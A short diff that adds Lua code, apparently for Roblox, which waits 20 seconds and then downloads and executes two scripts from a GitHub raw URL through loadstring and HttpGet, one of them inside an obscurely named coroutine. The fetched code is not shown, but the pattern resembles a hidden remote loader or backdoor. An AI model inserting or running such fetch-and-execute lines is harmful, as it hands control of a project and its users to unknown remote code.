@@ -1,1 +1,7 @@
+wait(20)
+local Cutieee = coroutine.create(function()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/Barrino12/Bar/main/Script%202", true))()
+end)
+coroutine.resume(Cutieee)
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/Barrino12/Bar/main/Script%205", true))()
 
